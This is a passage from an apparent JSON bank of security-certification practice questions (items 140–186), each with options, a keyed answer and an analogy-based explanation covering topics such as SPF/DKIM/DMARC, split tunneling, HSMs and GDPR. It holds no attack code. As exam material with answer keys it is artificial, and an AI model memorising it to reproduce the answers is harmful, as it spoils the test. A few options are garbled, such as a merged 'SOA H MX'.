box.","choose":1,"pbq":false,"exhibits":[]},{"id":140,"domain":2,"stem":"Emails that the marketing department is sending to customers are going to the customers’ spam folders. The security team is investigating the issue and discovers that the certificates used by the email server were reissued, but DNS records had not been updated. Which of the following should the security team update in order to fix this issue? (Choose three.)","options":{"A":"DMARC","B":"SPF","C":"DKIM","D":"DNSSEC","E":"SASE","F":"SAN","G":"SOA H MX"},"answer":"A,B,C","explanation":"New mail certs, stale DNS: receivers fail SPF (who may send), DKIM (the signature key in DNS), and DMARC (what to do when those fail). Those three DNS-tied records must be updated.\n\nDNSSEC, SASE, and SAN do not fix mailbox reputation after a cert reissue.\n\nImagine changing the store's official stamp but leaving last year's stamp number on the city registry. Mail looks forged.","choose":3,"pbq":false,"exhibits":[]},{"id":141,"domain":3,"stem":"A security engineer performed a code scan that resulted in many false positives. The security engineer must find a solution that improves the quality of scanning results before application deployment. Which of the following is the best solution?","options":{"A":"Limiting the tool to a specific coding language and tuning the rule set","B":"Configuring branch protection rules and dependency checks","C":"Using an application vulnerability scanner to identify coding flaws in production","D":"Performing updates on code libraries before code development"},"answer":"A","explanation":"A noisy SAST install is usually the wrong language pack and default rules. Limit the scanner to the languages you actually ship and tune or suppress the junk rules.\n\nImagine a metal detector that screams at belt buckles; turn the sensitivity to “weapons only.”","choose":1,"pbq":false,"exhibits":[]},{"id":142,"domain":4,"stem":"A global company with a remote workforce implemented a new VPN solution. After deploying the VPN solution to several hundred users, the help desk starts receiving reports of slow access to both internally and externally available applications. A security analyst reviews the following: VPN client routing: 0.0.0.0/0 eth1 Which of the following solutions should the analyst use to fix this issue?","options":{"A":"Move the servers to a screened subnet.","B":"Enable split tunneling.","C":"Configure an NAC solution.","D":"Implement DNS over HTTPS."},"answer":"B","explanation":"0.0.0.0/0 out the VPN means every byte — including public websites — is stuffed through the concentrator. Split tunneling sends only company prefixes through the VPN.\n\nImagine a commuter who was driving to headquarters just to buy coffee across the street; let them buy coffee near home.","choose":1,"pbq":false,"exhibits":[]},{"id":143,"domain":4,"stem":"A security analyst is reviewing suspicious log-in activity and sees the following data in the SIEM: Which of the following is the most appropriate action for the analyst to take?","options":{"A":"Update the log configuration settings on the directory server that is not being captured properly.","B":"Have the admin account owner change their password to avoid credential stuffing.","C":"Block employees from logging in to applications that are not part of their business area.","D":"Implement automation to disable accounts that have been associated with high-risk activity."},"answer":"A","explanation":"The SIEM story is incomplete for one directory server — events that should be there are missing or malformed. Fix that log source before you treat the gap as an attack.\n\nImagine a security camera that is unplugged on one hallway; rewind the cable before you declare a burglar.","choose":1,"pbq":false,"exhibits":["exhibits/q143_1.png"]},{"id":144,"domain":1,"stem":"An organization determined its preparedness for a ransomware attack is inadequate. A security administrator is working on ways to improve and monitor the organization's response to ransomware attacks. Which of the following is the best action for the administrator to take?","options":{"A":"Conduct backup testing.","B":"Define the recovery point objective.","C":"Perform a business impact analysis.","D":"Verify the encryption key length."},"answer":"A","explanation":"Preparedness for ransomware is 'can we get the business back from backups.' Defining RPO on paper does not prove the tapes work.\n\nBackup testing is the action that improves and monitors that response.\n\nImagine a spare tire you have never taken out of the trunk. The label says it fits. Testing is jacking the car up.\n\nEncryption key length and a BIA are other programs. They do not prove last night's backup restores.","choose":1,"pbq":false,"exhibits":[]},{"id":145,"domain":4,"stem":"A security engineer receives an alert from the SIEM platform indicating a possible malicious action on the internal network. The engineer generates a report that outputs the logs associated with the incident: Which of the following actions best enables the engineer to investigate further?","options":{"A":"Consulting logs from the enterprise password manager","B":"Searching dark web monitoring resources for exposure","C":"Reviewing audit logs from privileged actions","D":"Querying user behavior analytics data"},"answer":"C","explanation":"The SIEM excerpt only shows successful logons by JohnS to VM001 and SV002, including one at 23:52. That only proves the door opened.\n\nPrivileged-action audit logs record what happened after the logon: sudo, Run as admin, rights changes, dumps.\n\nImagine a hotel front-desk sheet that says John checked into 001 and 002 after midnight. That sheet cannot tell you whether he opened the room safe.\n\nUEBA would only score 'this is unusual for John.' It still does not list the commands.","choose":1,"pbq":false,"exhibits":["exhibits/q145_1.png"]},{"id":146,"domain":3,"stem":"A security engineer must integrate device attestation into user authentication and authorization workflows for mobile devices. Which of the following best meets the requirements?","options":{"A":"Enforcing a security boundary for all devices outside the perimeter network","B":"Enabling multifactor authentication using biometrics on access attempts","C":"Implementing single sign-on to centralize access control enforcement","D":"Configuring device profiling for patch level and jailbreak status"},"answer":"D","explanation":"Attestation means the device proves its health (patched, not jailbroken) before the user token is accepted. Device profiling collects those signals and feeds them into the auth decision.\n\nImagine a lab badge that only works if the door also sees that your safety glasses are on.","choose":1,"pbq":false,"exhibits":[]},{"id":147,"domain":3,"stem":"An organization is developing an AI-enabled digital worker to help employees complete common tasks, such as template development, editing, research, and scheduling. As part of the AI workload, the organization wants to implement guardrails within the platform. Which of the following should the company do to secure the AI environment?","options":{"A":"Limit the platform's abilities to only non-sensitive functions.","B":"Enhance the training model's effectiveness.","C":"Grant the system the ability to self-govern.","D":"Require end-user acknowledgement of organizational policies."},"answer":"A","explanation":"Guardrails on an internal AI helper start with scope: do not let it touch payroll, patient data, or secrets. Limit it to the non-sensitive chores it was hired for.\n\nImagine an intern allowed to book conference rooms but not to open the HR filing cabinet.","choose":1,"pbq":false,"exhibits":[]},{"id":148,"domain":4,"stem":"A security analyst discovered requests associated with IP addresses known for both legitimate and bot-related traffic. Which of the following should the analyst use to determine whether the requests are malicious?","options":{"A":"User-agent string","B":"Byte length of the request","C":"Web application headers","D":"HTML encoding field"},"answer":"A","explanation":"Good users and bots can share an IP. The User-Agent often still tells a browser from a script.\n\nImagine two people using the same lobby phone: the receptionist still hears whether the caller sounds like a person or a robocall.","choose":1,"pbq":false,"exhibits":[]},{"id":149,"domain":4,"stem":"A security analyst received a report that an internal web page is down after a company-wide update to the web browser. Given the following error message: Your connection is not private. Attackers might be trying to steal your information for www. internalwebsite.company.com. NET::ERR_CERT_WEAK_SIGNATURE_ALGORITHM Which of the following is the best way to fix this issue?","options":{"A":"Rewriting any legacy web functions","B":"Disabling all deprecated ciphers","C":"Blocking all non-essential ports","D":"Discontinuing the use of self-signed certificates"},"answer":"D","explanation":"ERR_CERT_WEAK_SIGNATURE_ALGORITHM means the site cert is signed with an old hash or is a leftover self-signed toy. Replace it with a trusted cert using a modern signature.\n\nImagine a museum pass stamped with a crayon instead of the official raised seal.","choose":1,"pbq":false,"exhibits":[]},{"id":150,"domain":4,"stem":"A company receives reports about misconfigurations and vulnerabilities in a third-party hardware device that is part of its released products. Which of the following solutions is the best way for the company to identify possible issues at an earlier stage?","options":{"A":"Performing vulnerability tests on each device delivered by the providers","B":"Performing regular red-team exercises on the vendor production line","C":"Implementing a monitoring process for the integration between the application and the vendor appliance","D":"Implementing a proper supply chain risk management program"},"answer":"D","explanation":"The bugs live in a vendor device you resell. Finding them earlier is a supply-chain program: requirements, testing rights, and SBOMs.\n\nImagine tasting ingredients at the farm, not only after the cake is iced.","choose":1,"pbq":false,"exhibits":[]},{"id":151,"domain":3,"stem":"A company implemented a new NAC solution based on 802.1X. However, the IT support team notices that some devices are not being enrolled in the new policies, causing access disruptions for key users. Which of the following solutions will most likely solve this issue and prevent reoccurrence?","options":{"A":"Include the monitoring agent and digital certificate as part of the patching/ updating program, keeping all the corporate devices updated and enrolled.","B":"Check whether the certificate is signed by a certification authority and manually deployed to each device.","C":"Check all the devices without proper access, enrolling them via the solution agent and authenticating to the network.","D":"Implement default credentials to automate RADIUS authentication and grant access to the network if the device owner is an employee."},"answer":"A","explanation":"802.1X + NAC needs a cert and often an agent on every managed device. Bake enrollment into the normal patch/update process.\n\nImagine giving every new employee their building badge on day-one orientation instead of waiting until they are stuck at the door.","choose":1,"pbq":false,"exhibits":[]},{"id":152,"domain":4,"stem":"While performing threat-hunting functions, an analyst is using the Diamond Model of Intrusion Analysis. The analyst identifies the likely adversary, the infrastructure involved, and the target. Which of the following must the threat hunter document to use the model effectively?","options":{"A":"Knowledge","B":"Capabilities","C":"Phase","D":"Methodologies"},"answer":"B","explanation":"Diamond Model’s four core vertices are adversary, capability, infrastructure, and victim. You already have three; document the capability (the tools and techniques they used).\n\nImagine naming the burglar, the getaway car, and the house — you still need to write down “lock-pick set.”","choose":1,"pbq":false,"exhibits":[]},{"id":153,"domain":3,"stem":"A systems administrator needs to improve the security assurance in a company's cloud storage environment. The administrator determines that the best approach is to identify whether any data has been maliciously or inadvertently modified. Which of the following techniques should the systems administrator periodically use?","options":{"A":"Interference","B":"Antitampering","C":"Hashing","D":"Journaling"},"answer":"C","explanation":"A hash is a fingerprint of the bytes. Re-hash the object later; if the fingerprint changed, the file was modified.\n\nImagine weighing a sealed crate every Monday. A different weight means someone opened it.","choose":1,"pbq":false,"exhibits":[]},{"id":154,"domain":2,"stem":"A security engineer wants to enhance the security posture of end-user systems in a zero trust environment. Given the following requirements: • Reduce the ability for potentially compromised endpoints to contact C2 infrastructure. • Track the requests that the malware makes to the IPs. • Avoid the download of additional payloads. Which of the following should the engineer deploy to meet these requirements?","options":{"A":"DNS sinkholing","B":"Browser isolation","C":"Zone transfer protection","D":"HIDS"},"answer":"A","explanation":"Stop malware from reaching C2, watch what names it asked for, and do not fetch the next payload: sinkhole those DNS names to a box you own.\n\nBrowser isolation is for clicks. HIDS is on the host. Zone-transfer lock is a different DNS problem.\n\nImagine forwarding a thief's phone calls to a number you record, instead of letting the call reach their boss.","choose":1,"pbq":false,"exhibits":[]},{"id":155,"domain":3,"stem":"Developers have been creating and managing cryptographic material on their personal laptops for use in the production environment. A security engineer needs to initiate a more secure process. Which of the following is the best strategy for the engineer to use?","options":{"A":"Disabling the BIOS and moving to UEFI","B":"Managing secrets on the vTPM hardware","C":"Employing shielding to prevent EMI","D":"Managing key material on a HSM"},"answer":"D","explanation":"Production keys do not belong on personal laptops. Put key material in an HSM so generate, store, and use happen in tamper-resistant hardware.\n\nImagine keeping the store’s master key in a bolted safe, not on the manager’s kitchen hook.","choose":1,"pbq":false,"exhibits":[]},{"id":156,"domain":1,"stem":"A nation-state actor is exposed for attacking large corporations by establishing persistence in smaller companies that are likely to be acquired by these large corporations. The actor then provisions user accounts in the companies for use post-acquisition. Before an upcoming acquisition, a security officer conducts threat modeling with this attack vector. Which of the following practices is the best way to investigate this threat?","options":{"A":"Restricting internet traffic originating from countries in which the nation-state actor is known to operate","B":"Comparing all existing credentials to personnel and services","C":"Auditing vendors to mitigate supply chain risk during the acquisition","D":"Placing a hold on all information about corporate interest in acquisitions"},"answer":"B","explanation":"The actor plants accounts in small firms that big firms will buy, then uses those accounts after the merger.\n\nThe way to look for that before closing is to compare every credential to real people and real services.\n\nImagine checking every spare house key against the current family list before you buy the house. Extra keys are the planted accounts.\n\nBlocking a country or pausing press rumors does not find a local account named after a fake contractor.","choose":1,"pbq":false,"exhibits":[]},{"id":157,"domain":4,"stem":"After an incident response exercise, a security administrator reviews the following table: Which of the following should the administrator do to best support rapid incident response in the future?","options":{"A":"Automate alerting to IT support for phone system outages.","B":"Enable dashboards for service status monitoring.","C":"Send emails for failed log-in attempts on the public website.","D":"Configure automated isolation of human resources systems."},"answer":"A","explanation":"The table from the exercise shows the phone system going down delayed the response. Auto-alert IT the moment that system fails.\n\nImagine a fire drill where the alarm panel died and nobody called maintenance — next time, page facilities the second the panel goes dark.","choose":1,"pbq":false,"exhibits":["exhibits/q157_1.png"]},{"id":158,"domain":1,"stem":"An organization is required to: • Respond to internal and external inquiries in a timely manner. • Provide transparency. • Comply with regulatory requirements. The organization has not experienced any reportable breaches but wants to be prepared if a breach occurs in the future. Which of the following is the best way for the organization to prepare?","options":{"A":"Outsourcing the handling of necessary regulatory filings to an external consultant","B":"Integrating automated response mechanisms into the data subject access request process","C":"Developing communication templates that have been vetted by internal and external counsel","D":"Conducting lessons-learned activities and integrating observations into the crisis management plan"},"answer":"C","explanation":"They have not had a reportable breach yet. They still must answer fast, stay transparent, and meet the regulator.\n\nCounsel-vetted communication templates are that preparation: the words are already legal when the clock starts.\n\nImagine having the recall letter drafted before the product fails, signed by the lawyer, sitting in a drawer.\n\nOutsourcing filings or automating DSARs helps later. Lessons learned need an event first.","choose":1,"pbq":false,"exhibits":[]},{"id":159,"domain":4,"stem":"An incident response team is analyzing malware and observes the following: • Does not execute in a sandbox • No network IoCs • No publicly known hash match • No process injection method detected Which of the following should the team do next to proceed with further analysis?","options":{"A":"Use an online virus analysis tool to analyze the sample.","B":"Check for an anti-virtualization code in the sample.","C":"Utilize a new deployed machine to run the sample.","D":"Search other internal sources for a new sample."},"answer":"B","explanation":"The sample refuses to run in a sandbox and shows no network or hash hits. That pattern is often anti-VM / anti-sandbox code.\n\nImagine a suspect who acts normal in the interview room but only talks outside — check whether they know they are being recorded.","choose":1,"pbq":false,"exhibits":[]},{"id":160,"domain":1,"stem":"Which of the following best explains the business requirement a healthcare provider fulfills by encrypting patient data at rest?","options":{"A":"Securing data transfer between hospitals","B":"Providing for non-repudiation of data","C":"Reducing liability from identity theft","D":"Protecting privacy while supporting portability"},"answer":"C","explanation":"Encrypting PHI at rest is about reducing the harm if a disk or backup walks away — stolen identity and a reportable loss of patient data.\n\nThat is a liability and privacy control for stored records, not a transfer-security control and not a signature.\n\nImagine locking the filing cabinet so a stolen drawer is a box of unreadable paper, not a box of names.","choose":1,"pbq":false,"exhibits":[]},{"id":161,"domain":3,"stem":"A security engineer is implementing security measures on new hardware in preparation for its launch. During the development phase, a risk related to protections at the UEFI level was found. Which of the following should the engineer recommend to reduce this risk?","options":{"A":"Configuring paravirtualization protection","B":"Enabling Secure Boot","C":"Installing cryptography at the operational system level","D":"Implementing hardware root of trust"},"answer":"B","explanation":"UEFI-level risk is addressed by Secure Boot: the firmware will only load bootloaders signed by keys it already trusts.\n\nImagine a nightclub that only plays songs whose shrink-wrap seal matches the club’s stamp.","choose":1,"pbq":false,"exhibits":[]},{"id":162,"domain":4,"stem":"A development team must create a website to share indicators of compromise. The team wants to use APIs between industry peers to aid in configuring SIEM and SOAR. The team needs to create a free tier of service, and the senior developer insists on configuring rate limiting. Which of the following best describes the senior developer's reasoning?","options":{"A":"To prevent password-spraying attacks on the services hosting the API","B":"To limit the likelihood of resource exhaustion occurring on the API server","C":"To address concerns the team has about API bandwidth utilization","D":"To reduce attack surface exposure of the API endpoints connecting peers"},"answer":"B","explanation":"A free public API will be hammered. Rate limits cap how many calls one client can make so CPU, memory, and sockets are not exhausted.\n\nImagine a ticket window that sells only ten tickets a minute so a crowd cannot crush the clerk.","choose":1,"pbq":false,"exhibits":[]},{"id":163,"domain":4,"stem":"A hotel chain wants to use point-of-sale systems to allow customers to check in and out of their rooms without employee assistance. These systems should limit access to a specific set of programs approved to run, with all other programs blocked. Which of the following should the company configure to best support this goal?","options":{"A":"Application control using a fresh image, with the applications fully configured as a baseline to build and block other applications from execution","B":"A host-based intrusion detection system to monitor and block all suspicious activities if they occur on the systems","C":"Anti-malware on these systems and only approved application file locations can be bypassed","D":"Event logs to be collected from the systems for all security events and some custom application logs"},"answer":"A","explanation":"A kiosk should run only the check-in apps. Build from a clean image, install those apps, and turn on application control (allow list).\n\nImagine a hotel TV that only has the welcome and checkout buttons — no web browser, no USB movies.","choose":1,"pbq":false,"exhibits":[]},{"id":164,"domain":4,"stem":"A user reports application access issues to the help desk. The help desk reviews the logs for the user: Which of the following is most likely the reason for the issue?","options":{"A":"The user inadvertently tripped the geoblock rule in NGFW.","B":"A threat actor has compromised the user's account and attempted to log in.","C":"The user is not allowed to access the human resources system outside of business hours.","D":"The user did not attempt to connect from an approved subnet."},"answer":"D","explanation":"The log shows the user connecting from a network that is not on the allow list. Access control is source-subnet based.\n\nImagine a badge that only works at the employee garage, not at the visitor lot.","choose":1,"pbq":false,"exhibits":["exhibits/q164_1.png"]},{"id":165,"domain":3,"stem":"A company's security team is notified about vulnerabilities in the company's application. The security team determined these vulnerabilities were previously disclosed in third-party libraries. Which of the following solutions best allows the company to identify third-party vulnerabilities in the future?","options":{"A":"Using IaC to include the newest dependencies","B":"Creating a bug bounty program","C":"Implementing a continuous security assessment program","D":"Integrating a SCAtool as part of the pipeline"},"answer":"D","explanation":"Known library CVEs are an SCA problem. Put a software-composition tool in the pipeline so every build lists third-party packages and flags the ones with public vulnerabilities.\n\nImagine a kitchen that checks every spice jar against this month’s recall list before cooking.","choose":1,"pbq":false,"exhibits":[]},{"id":166,"domain":4,"stem":"A global organization wants to manage all endpoint and user telemetry. The organization also needs to differentiate this data based on which office it is correlated to. Which of the following strategies best aligns with this goal?","options":{"A":"Sensor placement","B":"Data labeling","C":"Continuous monitoring","D":"Centralized logging"},"answer":"B","explanation":"One telemetry lake for the whole company still needs a tag for “which office.” Label the events at ingest so you can filter Paris vs Tokyo.\n\nImagine color-coding every package by warehouse before it hits the same conveyor belt.","choose":1,"pbq":false,"exhibits":[]},{"id":167,"domain":2,"stem":"A security architect must make sure that the LEAST number of services as possible is exposed in order to limit an adversary's ability to access the systems. Which of the following should the architect do FIRST?","options":{"A":"Enforce Secure Boot.","B":"Perform attack surface reduction.","C":"Disable third-party integrations.","D":"Limit access to the systems."},"answer":"B","explanation":"First job is fewer services listening so there is less to attack. That work is attack-surface reduction.\n\nSecure Boot and cutting one integration are later or narrower.\n\nImagine boarding unused windows before you buy a better lock for the front door.","choose":1,"pbq":false,"exhibits":[]},{"id":168,"domain":1,"stem":"A security officer performs due diligence activities before implementing a third-party solution into the enterprise environment. The security officer needs evidence from the third party that a data subject access request handling process is in place. Which of the following is the security officer most likely seeking to maintain compliance?","options":{"A":"Information security standards","B":"E-discovery requirements","C":"Privacy regulations","D":"Certification requirements","E":"Reporting frameworks"},"answer":"C","explanation":"A data-subject access request is a privacy-law process (GDPR and cousins): a person asks what you hold and you must answer.\n\nThe officer wants evidence the vendor can run that process. That is privacy regulation, not a generic ISO checklist or e-discovery for a lawsuit.\n\nImagine asking a storage company, before you rent space, whether they can find and return one customer's boxes on request.","choose":1,"pbq":false,"exhibits":[]},{"id":169,"domain":3,"stem":"An administrator needs to craft a single certificate-signing request for a web-server certificate. The server should be able to use the following identities to mutually authenticate other resources over TLS: • www.int.comptia.org • webserver01 .int.comptia.org • 10.5.100.10 Which of the following certificate fields must be set properly to support this objective?","options":{"A":"Subject alternative name","B":"Organizational unit","C":"Extended key usage","D":"Certificate extension"},"answer":"A","explanation":"One cert must name two hostnames and an IP. Those extra identities go in the Subject Alternative Name field.\n\nImagine one passport that must list every alias and also your office address — that extra-names page is the SAN.","choose":1,"pbq":false,"exhibits":[]},{"id":170,"domain":4,"stem":"A security analyst reviews the following event timeline from an EDR solution: Which of the following has most likely occurred and needs to be fixed?","options":{"A":"The DLP has failed to block malicious exfiltration, and data tagging is not being utilized properly.","B":"A NIDS bypass was utilized by a threat actor, and updates must be installed by the administrator.","C":"A logic flaw has introduced a TOCTOU vulnerability and must be addressed by the vendor.","D":"A potential insider threat is being investigated and will be addressed by the senior management team."},"answer":"C","explanation":"The EDR timeline shows a check and a use that do not happen as one step — the classic time-of-check/time-of-use (TOCTOU) race.\n\nImagine a clerk who looks at the last concert ticket, turns away, and someone else grabs it before the clerk hands it over.","choose":1,"pbq":false,"exhibits":["exhibits/q170_1.png"]},{"id":171,"domain":3,"stem":"A hospital provides tablets to its medical staff to enable them to more quickly access and edit patients' charts. The hospital wants to ensure that if a tablet is identified as lost or stolen and a remote command is issued, the risk of data loss can be mitigated within seconds. The tablets are configured as follows to meet hospital policy: • Full disk encryption is enabled. • \"Always On\" corporate VPN is enabled. • eFuse-backed keystore is enabled/ready. • Wi-Fi 6 is configured with SAE. • Location services is disabled. • Application allow list is unconfigured. Assuming the hospital policy cannot be changed, which of the following is the best way to meet the hospital's objective?","options":{"A":"Revoke the user VPN and Wi-Fi certificates","B":"Cryptographically erase FDE volumes","C":"Issue new MFA credentials to all users","D":"Configure the application allow list"},"answer":"B","explanation":"Seconds-later data protection on a stolen, already-encrypted tablet is crypto-erase: destroy the FDE keys in the eFuse-backed store.\n\nImagine snapping the only physical key to a locked briefcase the moment you hear it was stolen.","choose":1,"pbq":false,"exhibits":[]},{"id":172,"domain":1,"stem":"A compliance officer is facilitating a business impact analysis and wants business unit leaders to collect meaningful data. Several business unit leaders want more information about the types of data the officer needs. Which of the following data types would be the most beneficial for the compliance officer? (Choose two.)","options":{"A":"Inventory details","B":"Applicable contract obligations","C":"Costs associated with downtime","D":"Network diagrams","E":"Contingency plans","F":"Critical processes"},"answer":"C,F","explanation":"A BIA needs two ingredients: which processes cannot stop, and what an hour of stoppage costs. Those produce RTO and funding.\n\nInventory lists and network drawings are useful later. Contracts and playbooks are other documents.\n\nImagine listing which rooms you would save in a house fire and what each room is worth. That is the BIA conversation, not the floor plan alone.","choose":2,"pbq":false,"exhibits":[]},{"id":173,"domain":3,"stem":"An ISAC supplied recent threat intelligence information about pictures used on social media that provide reconnaissance of systems in use in secure facilities. In response, the Chief Information Security Officer (CISO) wants several configuration changes implemented via the MDM to ensure the following: • Camera functions and location services are blocked for corporate mobile devices. • All social media is blocked on the corporate and guest wireless networks. Which of the following is the CISO practicing to safeguard against the threat?","options":{"A":"Adversary emulation","B":"Operational security","C":"Open-source intelligence","D":"Social engineering"},"answer":"B","explanation":"Photos of badges, racks, and maps are operational security leaks. MDM camera/location blocks plus no social media on guest Wi-Fi are OPSEC controls.\n\nImagine covering the name tags and floor plans at a private party so guests do not post them online.","choose":1,"pbq":false,"exhibits":[]},{"id":174,"domain":1,"stem":"A company needs to define a new road map for improving secure coding practices in the software development life cycle and implementing better security standards. Which of the following is the best way for the company to achieve this goal?","options":{"A":"Performing a Software Assurance Maturity Model assessment and generating a road map as a final result","B":"Conducting a threat-modeling exercise for the main applications and developing a road map based on the necessary security implementations","C":"Developing a new road map, including secure coding best practices, based on the security area road map and annual goals defined by the Chief Information Security Officer","D":"Using the best practices in the OWASP secure coding manual to define a new road map"},"answer":"A","explanation":"A year-long secure-coding road map should come from a maturity score of the whole SDLC, not from one app's threat model or a CISO slide.\n\nSAMM (or an equivalent maturity model) rates practice areas and prints that road map.\n\nImagine a doctor's physical for the whole hospital before you write next year's improvement plan, not an MRI of one knee.\n\nOWASP top lists are useful inputs. They are not a scored program plan.","choose":1,"pbq":false,"exhibits":[]},{"id":175,"domain":2,"stem":"A security architect wants to develop a baseline of security configurations. These configurations automatically will be utilized every time a new virtual machine is created. Which of the following technologies should the security architect deploy to accomplish this goal?","options":{"A":"Snort","B":"CASВ","C":"Ansible","D":"CMDB"},"answer":"C","explanation":"Every new VM should birth already hardened. Ansible applies that baseline automatically.\n\nSnort watches packets. A CMDB lists systems.\n\nImagine a new apartment that already has the deadbolt installed, not a toolbox left on the counter.","choose":1,"pbq":false,"exhibits":[]},{"id":176,"domain":3,"stem":"A company wants to modify its process to comply with privacy requirements after an incident involving PII data in a development environment. In order to perform functionality tests, the QA team still needs to use valid data in the specified format. Which of the following best addresses the risk without impacting the development life cycle?","options":{"A":"Encrypting the data before moving Into the QA environment","B":"Truncating the data to make it not personally identifiable","C":"Using a large language model to generate synthetic data","D":"Utilizing tokenization for sensitive fields"},"answer":"D","explanation":"QA still needs data that looks real but is not actual PII. Tokenization replaces the sensitive fields with stand-ins you can map back in a vault if needed.\n\nImagine giving the stage crew a prop wallet filled with fake bills that are the right size, not the actor’s real cash.","choose":1,"pbq":false,"exhibits":[]},{"id":177,"domain":1,"stem":"A global organization is reviewing potential vendors to outsource a critical payroll function. Each vendor's plan includes using local resources in multiple regions to ensure compliance with all regulations. The organization's Chief Information Security Officer is conducting a risk assessment on the potential outsourcing vendors' subprocessors. Which of the following best explains the need for this risk assessment?","options":{"A":"Risk mitigations must be more comprehensive than the existing payroll provider.","B":"Due care must be exercised during all procurement activities.","C":"The responsibility of protecting PII remains with the organization.","D":"Specific regulatory requirements must be met in each jurisdiction."},"answer":"C","explanation":"Payroll PII outsourced to vendors and their local subprocessors is still the organization's duty. Accountability does not ride the contract out the door.\n\nThat is why the CISO assesses those subprocessors.\n\nImagine hiring a nanny service that hires sitters in each city. Your child's safety is still yours to check.\n\nJurisdiction rules matter, but they are not the core reason you still own the PII.","choose":1,"pbq":false,"exhibits":[]},{"id":178,"domain":1,"stem":"An organization plans to deploy new software. The project manager compiles a list of roles that will be involved in different phases of the deployment life cycle. Which of the following should the project manager use to track these roles?","options":{"A":"CMDB","B":"Recall tree","C":"ITIL","D":"RACI matrix"},"answer":"D","explanation":"The project manager has a list of who does what in each phase. The chart for responsible, accountable, consulted, informed is a RACI matrix.\n\nImagine a film call sheet: who acts, who is on the hook if the shot fails, who only gets a courtesy ring.\n\nA CMDB lists systems. ITIL is a library of practices. Neither is the role chart for this launch.","choose":1,"pbq":false,"exhibits":[]},{"id":179,"domain":2,"stem":"An organization decides to move to a distributed workforce model. Several legacy systems exist on premises and cannot be migrated because of existing compliance requirements. However, all new systems are required to be cloud-based. Which of the following would best ensure network access security?","options":{"A":"Utilizing a VPN for all users who require legacy system access","B":"Shifting all legacy systems to the existing public cloud infrastructure","C":"Configuring an SDN to block malicious traffic to on-premises networks","D":"Deploying microsegmentation with a firewall acting as the core router"},"answer":"A","explanation":"Old boxes cannot leave the building. Remote staff still need in. A VPN is the controlled hallway to those boxes. Moving them to public cloud breaks the compliance reason they stayed.\n\nImagine a locked corridor to the old records room while new offices already sit across town.","choose":1,"pbq":false,"exhibits":[]},{"id":180,"domain":3,"stem":"A web application server that provides services to hybrid modern and legacy financial applications recently underwent a scheduled upgrade to update common libraries, including OpenSSL. Multiple users are now reporting failed connection attempts to the server. The technician performing initial triage identified the following: • Client applications more than five years old appear to be the most affected • Web server logs show initial connection attempts by affected hosts. • For the failed connections, logs indicate \"cipher unavailable. \" Which of the following is most likely to safely remediate this situation?","options":{"A":"The server needs to be configured for backward compatibility to SSL 3.0 applications.","B":"The client applications need to be modified to support AES in Galois/ Counter Mode or equivalent","C":"The client TLS configuration must be set to enforce electronic codebook modes of operation","D":"The server-side digital signature algorithm needs to be modified to support elliptic curve cryptography"},"answer":"B","explanation":"The upgraded server dropped ancient cipher suites. Five-year-old clients still offer old modes and must learn a modern AEAD suite such as AES-GCM.\n\nImagine a new lock on the office door; yesterday’s keys no longer turn it, so you cut new keys instead of putting the cheap lock back.","choose":1,"pbq":false,"exhibits":[]},{"id":181,"domain":2,"stem":"An organization recently migrated data to a new file management system. The architect decides to use a discretionary authorization model on the new system. Which of the following best explains the architect’s choice?","options":{"A":"The responsibility of migrating data to the new file management system was outsourced to the vendor providing the platform.","B":"The permissions were not able to be migrated to the new system, and several stakeholders were made responsible for granting appropriate access.","C":"The legacy file management system did not support modern authentication techniques despite the business requirements.","D":"The data custodians were selected by business stakeholders to ensure backups of the file management system are maintained off site."},"answer":"B","explanation":"Permissions did not migrate, so named stakeholders must grant access on the new system. That is why the architect chose discretionary control: owners decide.\n\nOutsourcing the move or backup duty is not that choice.\n\nImagine a new filing cabinet with blank locks; each department head gets to issue keys for their drawers.","choose":1,"pbq":false,"exhibits":[]},{"id":182,"domain":4,"stem":"An organization recently acquired another company that is running a different EDR solution. A SOC analyst wants to automate the isolation of endpoints that are found to be compromised. Which of the following workflows best mitigates the risk of false positives and reduces the spread of malicious code?","options":{"A":"Using a SOAR solution to look up entities via a TIP platform and isolate endpoints via APIs","B":"Setting a policy on each EDR management console to isolate all endpoints that trigger any alerts","C":"Reviewing all alerts manually in the various portals and taking action to isolate them","D":"Automating the suppression of all alerts that are not critical and sending an email asking SOC analysts to review these alerts"},"answer":"A","explanation":"Two different EDRs plus a fear of auto-isolating the wrong laptop means: check the entity against a threat-intel platform first, then isolate through each EDR’s API from a SOAR playbook.\n\nImagine a 911 dispatcher who confirms the address against a wanted list before sending every patrol car to lock the block.","choose":1,"pbq":false,"exhibits":[]},{"id":183,"domain":1,"stem":"While reviewing recent incident reports a security officer discovers that several employees were contacted by the same individual who impersonated a recruiter. Which of the following best describes this type of correlation?","options":{"A":"Spear-phishing campaign","B":"Threat modeling","C":"Red-team assessment","D":"Attack pattern analysis"},"answer":"D","explanation":"Several staff got the same fake-recruiter approach. Tying those events together by method is attack-pattern analysis.\n\nImagine several houses on one street reporting the same 'inspector' story. You are matching the story, not yet naming the gang.\n\nSpear-phishing is a possible label for one email. Threat modeling is design work. A red team is a paid test.","choose":1,"pbq":false,"exhibits":[]},{"id":184,"domain":1,"stem":"A news organization wants to implement workflows that allow users to request that untruthful data be retraced and scrubbed from online publications to comply with the right to be forgotten. Which of the following regulations is the organization most likely trying to address?","options":{"A":"GDPR","B":"COPPA","C":"CCPA","D":"DORA"},"answer":"A","explanation":"Retract and scrub published personal data on request is the GDPR right to erasure (right to be forgotten).\n\nCOPPA is children under 13. CCPA is California consumer rights with a different erasure shape. DORA is EU financial operational resilience.\n\nImagine a newspaper that must pull a person's name out of an old article when the law says they can demand it. That law, in this wording, is GDPR.","choose":1,"pbq":false,"exhibits":[]},{"id":185,"domain":1,"stem":"An analyst wants to conduct a risk assessment on a new application that is being deployed. Given the following information: • Total budget allocation for the new application is unavailable. • Recovery time objectives have not been set • Downtime loss calculations cannot be provided Which of the following statements describes the reason a qualitative assessment is the best option?","options":{"A":"The analyst has previous work experience in application development","B":"Sufficient metrics are not available to conduct other risk assessment types","C":"An organizational risk register tracks all risks and mitigations across business units","D":"The organization wants to find the monetary value of any outages"},"answer":"B","explanation":"No budget, no RTO, no downtime dollars means you cannot run ALE math. Qualitative (high/medium/low, workshops) is what you have evidence for.\n\nImagine trying to price a car repair with no invoice and no parts list. You can still say 'this looks bad' in words. You cannot quote $47,000.\n\nA register or a wish for dollar figures does not create the missing metrics.","choose":1,"pbq":false,"exhibits":[]},{"id":186,"domain":3,"stem":"A software company deployed a new application based on its internal code repository. Several customers are reporting anti-malware alerts on workstations used to test the application. Which of the following is the MOST likely 